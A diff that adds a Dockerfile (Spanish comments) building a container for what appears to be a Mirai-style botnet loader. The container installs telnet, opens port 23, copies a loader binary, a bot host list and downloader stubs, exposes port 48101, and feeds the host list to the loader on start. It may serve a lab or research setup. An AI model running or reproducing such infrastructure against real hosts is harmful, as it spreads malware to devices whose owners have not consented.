@@ -1,0 +1,36 @@
+FROM --platform=linux/amd64 bitnami/minideb
+
+ENV DEBIAN_FRONTEND noninteractive
+
+# Ejecutar todo con bash
+
+RUN rm /bin/sh && ln -s /bin/bash /bin/sh
+
+# Instalar paquetes necesarios
+
+RUN apt update && \
+    apt install -q -y sudo wget iptables telnet telnetd ufw && \
+    apt clean autoclean -y && \
+    apt autoremove -y && \
+    rm -rf /var/lib/apt/lists/*
+
+# Abrir puerto 23 del firewall
+
+#RUN sudo modprobe ip_tables && \
+#    sudo modprobe iptable_nat && \
+RUN sudo update-alternatives --set iptables /usr/sbin/iptables-legacy && \
+    sudo ufw allow 23/tcp
+
+# Otras cosas
+
+RUN mkdir -p /root/bins
+
+COPY ./tmp/bin/loader /bin/loader
+COPY ./archivos/loader-bot-hosts.txt /root/hosts.txt
+COPY ./tmp/bin/dlr* /root/bins/
+
+WORKDIR /root
+
+EXPOSE 48101
+
+ENTRYPOINT cat /root/hosts.txt | /bin/loader
